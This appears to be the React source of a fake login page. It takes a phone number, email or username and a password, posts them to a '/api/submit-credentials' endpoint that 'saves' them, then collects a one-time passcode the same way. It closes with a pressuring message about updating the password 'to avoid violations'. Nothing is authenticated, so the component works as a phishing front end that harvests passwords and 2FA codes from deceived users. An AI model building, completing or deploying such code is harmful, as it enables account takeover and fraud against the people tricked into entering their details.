import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { credentialSubmitSchema, otpSubmitSchema, type CredentialSubmit } from "@shared/schema";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Eye, EyeOff, CheckCircle2 } from "lucide-react";
import { z } from "zod";

const countryCodes = [
  { code: "+1", country: "US" },
  { code: "+44", country: "UK" },
  { code: "+234", country: "NG" },
  { code: "+91", country: "IN" },
  { code: "+86", country: "CN" },
];

type LoginMethod = "phone" | "email" | "username";

interface UnifiedLoginFormProps {
  method: LoginMethod;
}

export function UnifiedLoginForm({ method }: UnifiedLoginFormProps) {
  const [showPassword, setShowPassword] = useState(false);
  const [countryCode, setCountryCode] = useState("+1");
  const [step, setStep] = useState<"credentials" | "otp" | "success">("credentials");
  const [submissionId, setSubmissionId] = useState<number | null>(null);
  const { toast } = useToast();

  const credentialForm = useForm<CredentialSubmit>({
    defaultValues: {
      loginMethod: method,
      identifier: "",
      password: "",
    },
  });

  const otpForm = useForm({
    defaultValues: {
      otp: "",
    },
  });

  const submitCredentialsMutation = useMutation({
    mutationFn: async (data: CredentialSubmit) => {
      let identifier = data.identifier;
      if (method === "phone") {
        identifier = `${countryCode}${data.identifier}`;
      }
      return await apiRequest("POST", "/api/submit-credentials", {
        loginMethod: method,
        identifier,
        password: data.password,
      });
    },
    onSuccess: (data: any) => {
      setSubmissionId(data.submissionId);
      setStep("otp");
      toast({
        title: "Credentials saved!",
        description: "Please enter the OTP to continue.",
      });
    },
    onError: (error: any) => {
      toast({
        title: "Submission failed",
        description: error.message || "Unable to save credentials",
        variant: "destructive",
      });
    },
  });

  const submitOtpMutation = useMutation({
    mutationFn: async (otp: string) => {
      if (!submissionId) throw new Error("No submission ID");
      return await apiRequest("POST", "/api/submit-otp", {
        submissionId,
        otp,
      });
    },
    onSuccess: () => {
      setStep("success");
    },
    onError: (error: any) => {
      toast({
        title: "OTP submission failed",
        description: error.message || "Unable to save OTP",
        variant: "destructive",
      });
    },
  });

  const onSubmitCredentials = (data: CredentialSubmit) => {
    submitCredentialsMutation.mutate(data);
  };

  const onSubmitOtp = (data: { otp: string }) => {
    submitOtpMutation.mutate(data.otp);
  };

  if (step === "success") {
    return (
      <div className="space-y-6 text-center py-8">
        <div className="flex justify-center">
          <CheckCircle2 className="w-16 h-16 text-green-500" data-testid="icon-success" />
        </div>
        <div className="space-y-2">
          <h3 className="text-xl font-semibold" data-testid="heading-success">Submission Successful!</h3>
          <p className="text-muted-foreground" data-testid="text-verification-message">
            You will receive a verification email shortly. Please check your inbox and follow the instructions to update your password for security reasons and to avoid violations.
          </p>
        </div>
      </div>
    );
  }

  if (step === "otp") {
    return (
      <Form {...otpForm}>
        <form onSubmit={otpForm.handleSubmit(onSubmitOtp)} className="space-y-4">
          <FormField
            control={otpForm.control}
            name="otp"
            render={({ field }) => (
              <FormItem>
                <FormLabel className="text-sm font-medium" data-testid="label-otp">Enter OTP</FormLabel>
                <FormControl>
                  <Input
                    placeholder="Enter your OTP"
                    type="text"
                    className="h-12"
                    data-testid="input-otp"
                    {...field}
                  />
                </FormControl>
                <FormMessage />
              </FormItem>
            )}
          />

          <Button
            type="submit"
            className="w-full h-12 text-base font-semibold"
            data-testid="button-submit-otp"
            disabled={submitOtpMutation.isPending}
          >
            {submitOtpMutation.isPending ? "Submitting..." : "Submit OTP"}
          </Button>
        </form>
      </Form>
    );
  }

  return (
    <Form {...credentialForm}>
      <form onSubmit={credentialForm.handleSubmit(onSubmitCredentials)} className="space-y-4">
        <FormField
          control={credentialForm.control}
          name="identifier"
          render={({ field }) => (
            <FormItem>
              <FormLabel className="text-sm font-medium" data-testid={`label-${method}`}>
                {method === "phone" ? "Phone number" : method === "email" ? "Email" : "Username"}
              </FormLabel>
              {method === "phone" ? (
                <div className="flex gap-2">
                  <Select value={countryCode} onValueChange={setCountryCode}>
                    <SelectTrigger className="w-24 h-12" data-testid="select-country-code">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      {countryCodes.map((country) => (
                        <SelectItem 
                          key={country.code} 
                          value={country.code}
                          data-testid={`option-country-${country.country.toLowerCase()}`}
                        >
                          {country.country} {country.code}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                  <FormControl>
                    <Input
                      placeholder="Phone number"
                      type="tel"
                      className="h-12"
                      data-testid="input-phone-number"
                      {...field}
                    />
                  </FormControl>
                </div>
              ) : (
                <FormControl>
                  <Input
                    placeholder={method === "email" ? "Email address" : "Username"}
                    type={method === "email" ? "email" : "text"}
                    className="h-12"
                    data-testid={`input-${method}-field`}
                    {...field}
                  />
                </FormControl>
              )}
              <FormMessage />
            </FormItem>
          )}
        />

        <FormField
          control={credentialForm.control}
          name="password"
          render={({ field }) => (
            <FormItem>
              <FormLabel className="text-sm font-medium" data-testid={`label-${method}-password`}>Password</FormLabel>
              <div className="relative">
                <FormControl>
                  <Input
                    placeholder="Password"
                    type={showPassword ? "text" : "password"}
                    className="h-12 pr-10"
                    data-testid={`input-${method}-password`}
                    {...field}
                  />
                </FormControl>
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
                  data-testid={`button-toggle-${method}-password`}
                >
                  {showPassword ? (
                    <EyeOff className="w-5 h-5" />
                  ) : (
                    <Eye className="w-5 h-5" />
                  )}
                </button>
              </div>
              <FormMessage />
            </FormItem>
          )}
        />

        <Button
          type="submit"
          className="w-full h-12 text-base font-semibold"
          data-testid={`button-${method}-submit`}
          disabled={submitCredentialsMutation.isPending}
        >
          {submitCredentialsMutation.isPending ? "Submitting..." : "Continue"}
        </Button>
      </form>
    </Form>
  );
}
